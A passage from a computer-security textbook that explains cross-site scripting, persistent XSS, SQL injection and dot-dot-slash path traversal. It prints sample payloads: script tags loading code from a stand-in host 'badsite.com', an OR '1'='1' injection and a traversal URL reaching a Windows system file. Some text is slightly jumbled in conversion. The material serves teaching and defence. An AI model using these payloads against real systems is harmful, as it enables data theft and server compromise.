
# How is access to user’s data a threat?

A script might look for any file named `address_book` and send it to `spam_target.com`, where an application would craft spam messages to all the addresses, with the user as the apparent sender. Or code might look for any file containing numbers of the form `ddd-dd-dddd` (the standard format of a U.S. social security number) and transmit that file to an identity thief. The possibilities are endless.

The search and response URL we listed could contain a script as follows:

[Click here to view code image](#ch04_images.html#p262pro01a)

```
http://www.google.com/search?name=<SCRIPT
SRC=http://badsite.com/xss.js></SCRIPT>
&q=cross+site+scripting&ie=utf-8&oe=utf-8
&aq=t&rls=org.mozilla:en-US:official
&client=firefox-a&lr=lang_en
```

This string would connect to [badsite.com](http://badsite.com) where it would execute the Java script `xss` that could do anything allowed by the user’s security context.

Remember that the browser and server pass these parameters back and forth to maintain context between a server and the user’s session. Sometimes a volley from the client will contain a script for the server to execute. The attack can also harm the server side if the server interprets and executes the script or saves the script and returns it to other clients (who would then execute the script). Such behavior is called a **persistent cross-site scripting attack**. An example of such an attack could occur in a blog or stream of comments. Suppose station KCTV posted news stories online about which it invited users to post comments. A malicious user could post a comment with embedded HTML containing a script, such as but their browser would execute the malicious script. As described in [Sidebar 4-8](#ch04.html#ch04sb08), one attacker even tried (without success) to use this same approach by hand on paper.

[Click here to view code image](#ch04_images.html#p262pro02a)

```
Cool<br>story.<br>KCTVBigFan<script
src=http://badsite.com/xss.js></script>
```

from the script source we just described. Other users who opened the comments area would automatically download the previous comments and see

Cool

story.

KCTVBigFan

---

## Sidebar 4-8 Scripting Votes

In Swedish elections anyone can write in any candidate. The Swedish election authority publishes all write-in candidate votes, listing them on a web site ([http://www.val.se/val/val2010/handskrivna/handskrivna.skv](http://www.val.se/val/val2010/handskrivna/handskrivna.skv)). One write-in vote was recorded as the following:

[Click here to view code image](#ch04_images.html#p263pro01a)

```
[Voting location: R;14;Västra Götalands
län;80;Göteborg;03;Göteborg, Centrum;
0722;Centrum, Övre Johanneberg;]
(Script src=http://hittepa.webs.com/x.txt);1
```

This is perhaps the first example of a pen-and-paper script attack. Not only did it fail because the paper ballot was incapable of executing code, but without the HTML indicators `<script>` and `</script>`, this “code” would not execute even if the underlying web page were displayed by a browser. But within a few elections someone may figure out how to encode a valid script on a paper ballot, or worse, on an electronic one.

---

## SQL Injection

Cross-site scripting attacks are one example of the category of injection attacks, in which malicious content is inserted into a valid client–server exchange. Another injection attack, called **SQL injection**, operates by inserting code into an exchange between a client and database server.

To understand this attack, you need to know that database management systems (DBMSs) use a language called **SQL** (which, in this context, stands for structured query language) to represent queries to the DBMS. The queries follow a standard syntax that is not too difficult to understand, at least for simple queries. For example, the query

[Click here to view code image](#ch04_images.html#p263pro02a)

```
SELECT * FROM users WHERE name = 'Williams';
```

will return all database records having “Williams” in the name field.

Often these queries are composed through a browser and transmitted to the database server supporting the web page. A bank might have an application that allows a user to download all transactions involving the user’s account. After the application identifies and authenticates the user, it might compose a query for the user on the order of

[Click here to view code image](#ch04_images.html#p263pro03a)

```
QUERY = "SELECT * FROM trans WHERE acct='"
+ acctNum + "';"
```

and submit that query to the DBMS. Because the communication is between an application running on a browser and the web server, the query is encoded within a long URL string

[Click here to view code image](#ch04_images.html#p264pro01a)

```
http://www.mybank.com
?QUERY=SELECT%20*%20FROM%20trans%20WHERE%20acct='2468'
```

In this command, the space character has been replaced by its numeric equivalent `%20` (because URLs cannot contain spaces), and the browser has substituted ‘2468’ for the account number variable. The DBMS will parse the string and return records appropriately.

If the user can inject a string into this interchange, the user can force the DBMS to return a set of records. The DBMS evaluates the WHERE clause as a logical expression. If the user enters the account number as “‘2468’ OR ‘1’=‘1’” the resulting query becomes

[Click here to view code image](#ch04_images.html#p264pro02a)

```
QUERY = "SELECT * FROM trans WHERE acct='"
+ acctNum + "';"
```

and after account number expansion it becomes

[Click here to view code image](#ch04_images.html#p264pro03a)

```
QUERY = "SELECT * FROM trans WHERE acct='2468'
OR '1'='1'"
```

Because ‘1’=‘1’ is always TRUE, the OR of the two parts of the WHERE clause is always TRUE, every record satisfies the value of the WHERE clause and so the DBMS will return all records in the database.

The trick here, as with cross-site scripting, is that the browser application includes direct user input into the command, and the user can force the server to execute arbitrary SQL commands.

## Dot-Dot-Slash

Web-server code should always run in a constrained environment. Ideally, the web server should never have editors, `xterm` and `Telnet` programs, or even most system utilities loaded. By constraining the environment in this way, even if an attacker escapes from the web-server application, no other executable programs will help the attacker use the web server’s computer and operating system to extend the attack. The code and data for web applications can be transferred manually to a web server or pushed as a raw image.

But many web applications programmers are naïve. They expect to need to edit a web application in place, so they install editors and system utilities on the server to give them a complete environment in which to program.

A second, less desirable, condition for preventing an attack is to create a fence confining the web-server application. With such a fence, the server application cannot escape from its area and access other potentially dangerous system areas (such as editors and utilities). The server begins in a particular directory subtree, and everything the server needs is in that same subtree.

Enter the dot-dot. In both Unix and Windows, `..` is the directory indicator for “predecessor.” And `../..` is the grandparent of the current location. So someone who can enter file names can travel back up the directory tree one `..` at a time. Cerberus Information Security analysts found just that vulnerability in the `webhits.dll` extension for the Microsoft Index Server. For example, passing the following URL causes the server to return the requested file, `autoexec.nt`, enabling an attacker to modify or delete it.

[Click here to view code image](#ch04_images.html#p265pro01a)

```
http://yoursite.com/webhits.htw?CiWebHits
&File=../../../../../winnt/system32/autoexec.nt
```

## Server-Side Include
